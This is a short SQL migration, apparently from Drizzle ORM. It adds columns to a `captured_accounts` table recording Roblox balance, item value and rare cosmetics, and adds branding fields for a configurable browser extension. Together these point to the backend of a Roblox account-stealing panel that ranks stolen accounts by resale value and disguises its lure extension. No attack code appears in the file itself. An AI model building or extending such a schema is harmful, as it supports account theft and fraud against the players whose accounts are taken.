ALTER TABLE `captured_accounts` ADD `robux` int DEFAULT 0;--> statement-breakpoint
ALTER TABLE `captured_accounts` ADD `rap` int DEFAULT 0;--> statement-breakpoint
ALTER TABLE `captured_accounts` ADD `summary` int DEFAULT 0;--> statement-breakpoint
ALTER TABLE `captured_accounts` ADD `hasKorblox` boolean DEFAULT false;--> statement-breakpoint
ALTER TABLE `captured_accounts` ADD `hasHeadless` boolean DEFAULT false;--> statement-breakpoint
ALTER TABLE `config` ADD `extensionTitle` text;--> statement-breakpoint
ALTER TABLE `config` ADD `extensionDescription` text;--> statement-breakpoint
ALTER TABLE `config` ADD `extensionBackground` text;--> statement-breakpoint
ALTER TABLE `config` ADD `extensionPrimaryColor` varchar(7);